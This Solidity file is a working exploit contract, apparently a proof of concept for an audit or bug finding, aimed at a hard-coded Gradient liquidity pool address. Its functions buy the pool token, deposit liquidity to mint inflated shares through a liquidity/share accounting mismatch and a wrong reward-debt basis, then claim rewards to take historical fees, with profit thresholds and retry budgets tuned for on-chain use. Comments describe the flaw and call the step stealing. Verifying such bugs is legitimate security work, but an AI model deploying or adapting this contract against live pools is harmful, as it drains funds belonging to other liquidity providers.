// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IGradientRegistryLike {
    function gradientToken() external view returns (address);
    function router() external view returns (address);
    function blockedTokens(address token) external view returns (bool);
}

interface IGradientPoolLike {
    struct PoolInfo {
        uint256 totalEth;
        uint256 totalToken;
        uint256 totalLiquidity;
        uint256 totalLPShares;
        uint256 accRewardPerShare;
        uint256 rewardBalance;
        address uniswapPair;
    }

    function gradientRegistry() external view returns (address);
    function getPoolInfo(address token) external view returns (PoolInfo memory);
    function getReserves(address token) external view returns (uint256 reserveETH, uint256 reserveToken);
    function provideLiquidity(address token, uint256 tokenAmount, uint256 minTokenAmount) external payable;
    function withdrawLiquidity(address token, uint256 shares) external;
    function claimReward(address token) external;
    function transferETHToOrderbook(address token, uint256 amount) external;
    function transferTokenToOrderbook(address token, uint256 amount) external;
    function receiveETHFromOrderbook(address token, uint256 amount) external payable;
    function receiveTokenFromOrderbook(address token, uint256 amount) external;
}

interface IUniswapV2Router02Like {
    function WETH() external pure returns (address);
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract FlawVerifier {
    address public constant TARGET = 0x37Ea5f691bCe8459C66fFceeb9cf34ffa32fdadC;

    uint256 private constant SCALE = 1e18;
    uint256 private constant MIN_REQUIRED_PROFIT = 0.1 ether;

    uint256 private _profitAmount;
    address private _profitToken;

    constructor() {}

    function executeOnOpportunity() external {
        _profitToken = address(0);
        _profitAmount = 0;

        uint256 startBalance = address(this).balance;

        IGradientPoolLike pool = IGradientPoolLike(TARGET);

        address registryAddress;
        try pool.gradientRegistry() returns (address value) {
            registryAddress = value;
        } catch {
            return;
        }
        if (registryAddress == address(0)) return;

        IGradientRegistryLike registry = IGradientRegistryLike(registryAddress);

        address token;
        try registry.gradientToken() returns (address value) {
            token = value;
        } catch {
            return;
        }
        if (token == address(0) || registry.blockedTokens(token)) return;

        IGradientPoolLike.PoolInfo memory info;
        try pool.getPoolInfo(token) returns (IGradientPoolLike.PoolInfo memory value) {
            info = value;
        } catch {
            return;
        }

        if (info.totalLiquidity == 0 || info.totalLPShares == 0) return;
        if (info.accRewardPerShare == 0) return;

        address routerAddress;
        try registry.router() returns (address value) {
            routerAddress = value;
        } catch {
            return;
        }
        if (routerAddress == address(0)) return;

        IUniswapV2Router02Like router = IUniswapV2Router02Like(routerAddress);

        address weth;
        try router.WETH() returns (address value) {
            weth = value;
        } catch {
            return;
        }
        if (weth == address(0)) return;

        // Exploit path alignment:
        // 1) `transferETHToOrderbook` or `transferTokenToOrderbook` can reduce
        //    `pool.totalLiquidity` without reducing `pool.totalLPShares`.
        // 2) Then `provideLiquidity` mints shares from `pool.totalLPShares / pool.totalLiquidity`,
        //    but updates `rewardDebt` from deposit amounts instead of minted shares.
        // 3) An immediate `claimReward` can steal historical fees.
        //
        // The opposite path also matters for the finding:
        // - `receiveETHFromOrderbook` or `receiveTokenFromOrderbook` can increase
        //   `pool.totalLiquidity` without increasing `pool.totalLPShares`.
        // - Later `claimReward` or `withdrawLiquidity` can underflow because
        //   `rewardDebt` was tracked on `tokenAmount + ethAmount` while settlement uses lpShares.
        // - That is the claim-lockup half of the bug; this verifier does not intentionally enter it,
        //   because a reverting `claimReward` / `withdrawLiquidity` path is not the profitable objective.

        if (info.totalLiquidity >= info.totalLPShares) {
            return;
        }

        uint256[4] memory buyBudgets = [uint256(0.25 ether), 0.5 ether, 0.75 ether, 1 ether];
        for (uint256 i = 0; i < buyBudgets.length; i++) {
            if (_attemptRewardTheft(pool, router, weth, token, info, buyBudgets[i])) {
                break;
            }
        }

        uint256 endBalance = address(this).balance;
        if (endBalance > startBalance) {
            _profitAmount = endBalance - startBalance;
            _profitToken = address(0);
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _attemptRewardTheft(
        IGradientPoolLike pool,
        IUniswapV2Router02Like router,
        address weth,
        address token,
        IGradientPoolLike.PoolInfo memory info,
        uint256 buyBudget
    ) internal returns (bool) {
        if (buyBudget == 0) return false;
        if (address(this).balance <= buyBudget) return false;

        uint256 ethBefore = address(this).balance;
        uint256 tokenBefore = IERC20Like(token).balanceOf(address(this));

        // Realistic economic sourcing step: buy the live pool token on-chain so the PoC
        // does not rely on balance injection. This preserves the same exploit causality:
        // the reward bug still comes from `pool.totalLiquidity` vs `pool.totalLPShares`
        // and the wrong `rewardDebt` basis inside `provideLiquidity` / `claimReward`.
        if (!_buyWithExactEth(router, weth, token, buyBudget)) {
            return false;
        }

        uint256 boughtAmount = IERC20Like(token).balanceOf(address(this)) - tokenBefore;
        if (boughtAmount == 0) {
            return false;
        }

        uint256 depositEth = _findMatchingEthDeposit(pool, token, boughtAmount);
        if (depositEth == 0 || address(this).balance < depositEth) {
            _swapAllTokenBalanceToEth(router, token, weth);
            return false;
        }

        uint256 contribution = boughtAmount + depositEth;
        uint256 mintedShares = (contribution * info.totalLPShares) / info.totalLiquidity;
        if (mintedShares <= contribution) {
            _swapAllTokenBalanceToEth(router, token, weth);
            return false;
        }

        uint256 stolenHistoricalRewards = ((mintedShares - contribution) * info.accRewardPerShare) / SCALE;
        uint256 totalCapitalCommitted = buyBudget + depositEth;
        if (stolenHistoricalRewards <= totalCapitalCommitted + MIN_REQUIRED_PROFIT) {
            _swapAllTokenBalanceToEth(router, token, weth);
            return false;
        }

        if (stolenHistoricalRewards > TARGET.balance + depositEth) {
            _swapAllTokenBalanceToEth(router, token, weth);
            return false;
        }

        if (!_approveToken(token, TARGET, boughtAmount)) {
            _swapAllTokenBalanceToEth(router, token, weth);
            return false;
        }

        (bool deposited, ) = TARGET.call{value: depositEth}(
            abi.encodeWithSelector(IGradientPoolLike.provideLiquidity.selector, token, boughtAmount, 0)
        );
        if (!deposited) {
            _swapAllTokenBalanceToEth(router, token, weth);
            return false;
        }

        (bool claimed, ) = TARGET.call(abi.encodeWithSelector(IGradientPoolLike.claimReward.selector, token));
        if (!claimed) {
            return false;
        }

        _profitToken = address(0);
        _profitAmount = address(this).balance > ethBefore ? address(this).balance - ethBefore : 0;
        return _profitAmount >= MIN_REQUIRED_PROFIT;
    }

    function _findMatchingEthDeposit(
        IGradientPoolLike pool,
        address token,
        uint256 tokenAmount
    ) internal view returns (uint256) {
        (uint256 reserveETH, uint256 reserveToken) = _safeReserves(pool, token);
        if (reserveETH == 0 || reserveToken == 0 || tokenAmount == 0) return 0;

        uint256 base = (tokenAmount * reserveETH) / reserveToken;
        if (base == 0) return 0;

        uint256[9] memory bps = [uint256(10000), 9999, 10001, 9990, 10010, 9900, 10100, 9800, 10200];
        for (uint256 i = 0; i < bps.length; i++) {
            uint256 ethAmount = (base * bps[i]) / 10000;
            if (_matchesPoolRatio(ethAmount, tokenAmount, reserveETH, reserveToken)) {
                return ethAmount;
            }
        }

        return 0;
    }

    function _matchesPoolRatio(
        uint256 ethAmount,
        uint256 tokenAmount,
        uint256 reserveETH,
        uint256 reserveToken
    ) internal pure returns (bool) {
        if (ethAmount == 0 || tokenAmount == 0 || reserveETH == 0 || reserveToken == 0) return false;

        uint256 expectedTokens = (ethAmount * reserveToken) / reserveETH;
        if (expectedTokens == 0) return false;

        return tokenAmount >= (expectedTokens * 99) / 100 && tokenAmount <= (expectedTokens * 101) / 100;
    }

    function _safeReserves(
        IGradientPoolLike pool,
        address token
    ) internal view returns (uint256 reserveETH, uint256 reserveToken) {
        try pool.getReserves(token) returns (uint256 ethReserve, uint256 tokenReserve) {
            reserveETH = ethReserve;
            reserveToken = tokenReserve;
        } catch {}
    }

    function _buyWithExactEth(
        IUniswapV2Router02Like router,
        address weth,
        address token,
        uint256 ethAmount
    ) internal returns (bool) {
        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = token;

        try router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: ethAmount}(
            0,
            path,
            address(this),
            block.timestamp
        ) {
            return true;
        } catch {
            return false;
        }
    }

    function _swapAllTokenBalanceToEth(
        IUniswapV2Router02Like router,
        address token,
        address weth
    ) internal {
        uint256 balance = IERC20Like(token).balanceOf(address(this));
        if (balance == 0) return;

        if (!_approveToken(token, address(router), balance)) {
            return;
        }

        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = weth;

        try router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            balance,
            0,
            path,
            address(this),
            block.timestamp
        ) {} catch {}
    }

    function _approveToken(address token, address spender, uint256 amount) internal returns (bool) {
        (bool ok0, bytes memory data0) = token.call(
            abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0)
        );
        if (!ok0 || (data0.length != 0 && !abi.decode(data0, (bool)))) {
            return false;
        }

        (bool ok1, bytes memory data1) = token.call(
            abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount)
        );
        return ok1 && (data1.length == 0 || abi.decode(data1, (bool)));
    }

    receive() external payable {}
}
